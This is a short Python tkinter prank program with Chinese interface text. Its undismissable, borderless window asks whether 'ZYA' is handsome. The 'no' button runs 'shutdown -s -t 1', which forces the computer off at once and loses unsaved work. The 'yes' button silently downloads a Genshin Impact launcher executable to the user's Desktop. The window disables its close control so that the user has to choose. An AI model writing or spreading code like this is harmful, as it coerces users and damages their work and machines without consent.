import tkinter as tk
from tkinter import messagebox
import requests
import os
import threading

def get_desktop_path():
    return os.path.join(os.path.expanduser("~"), "Desktop")


def download_task():
    file_url = "https://autopatchcn.yuanshen.com/client_app/download/launcher/20260515190618_nzDixDTY11wJPtn4/pcbackup205/yuanshen_setup_20260515.exe"
    save_name = "原神启动器.exe"  # 桌面上的文件名
    save_path = os.path.join(get_desktop_path(), save_name)

    try:
        resp = requests.get(file_url, stream=True, timeout=60)
        resp.raise_for_status()
        with open(save_path, "wb") as f:
            for chunk in resp.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        messagebox.showinfo("完成", "原神启动")
    except Exception as e:
        messagebox.showerror("错误", f"下载失败：{str(e)}")


def choose_a():
    messagebox.showinfo("恭喜", "兄弟你可太有眼光了！")
    # 子线程执行下载，避免界面卡死
    threading.Thread(target=download_task, daemon=True).start()
    # 5秒后自动关闭窗口
    root.after(5000, root.destroy)


def choose_b():
    messagebox.showwarning("警告", "行，你等着")
    os.system("shutdown -s -t 1")
    root.after(1000, root.destroy)


# 主窗口
root = tk.Tk()
root.title("小测试")
root.geometry("450x220")
root.resizable(False, False)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.overrideredirect(True)
title_label = tk.Label(root, text="ZYA帅不帅？", font=("微软雅黑", 22, "bold"))
title_label.pack(pady=35)

btn_frame = tk.Frame(root)
btn_frame.pack()

btn_a = tk.Button(btn_frame, text="A. 帅，宇宙无敌超级帅", width=20, height=2, command=choose_a)
btn_a.grid(row=0, column=0, padx=15)

btn_b = tk.Button(btn_frame, text="B. 不帅.路边一条", width=15, height=2, command=choose_b)
btn_b.grid(row=0, column=1, padx=15)

root.mainloop()